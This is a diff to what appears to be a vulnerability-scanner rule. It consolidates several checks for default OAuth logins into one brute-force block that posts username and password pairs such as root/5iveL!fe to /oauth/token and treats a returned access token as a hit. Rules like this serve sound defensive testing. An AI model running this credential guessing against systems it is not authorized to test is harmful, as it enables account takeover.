@@ -18,57 +18,24 @@ set:
   hosturl: request.url
 rules:
   r0:
+    stop_if_match: true
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      username:
+        - root
+        - admin
+        - admin@local.host
+      password:
+        - 5iveL!fe
+        - 123456789
     request:
       method: POST
       path: /oauth/token
       headers:
         content-type: application/json
       body: |
-        {"grant_type":"password","username":"root","password":"5iveL!fe"}
+        {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
     expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-  r1:
-    request:
-      method: POST
-      path: /oauth/token
-      headers:
-        content-type: application/json
-      body: |
-        {"grant_type":"password","username":"root","password":"123456789"}
-    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-  r2:
-    request:
-      method: POST
-      path: /oauth/token
-      headers:
-        content-type: application/json
-      body: |
-        {"grant_type":"password","username":"admin","password":"5iveL!fe"}
-    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-  r3:
-    request:
-      method: POST
-      path: /oauth/token
-      headers:
-        content-type: application/json
-      body: |
-        {"grant_type":"password","username":"admin","password":"123456789"}
-    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-  r4:
-    request:
-      method: POST
-      path: /oauth/token
-      headers:
-        content-type: application/json
-      body: |
-        {"grant_type":"password","username":"admin@local.host","password":"5iveL!fe"}
-    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-  r5:
-    request:
-      method: POST
-      path: /oauth/token
-      headers:
-        content-type: application/json
-      body: |
-        {"grant_type":"password","username":"admin@local.host","password":"123456789"}
-    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
-expression: r0() || r1() || r2() || r3() || r4() || r5()
+expression: r0()
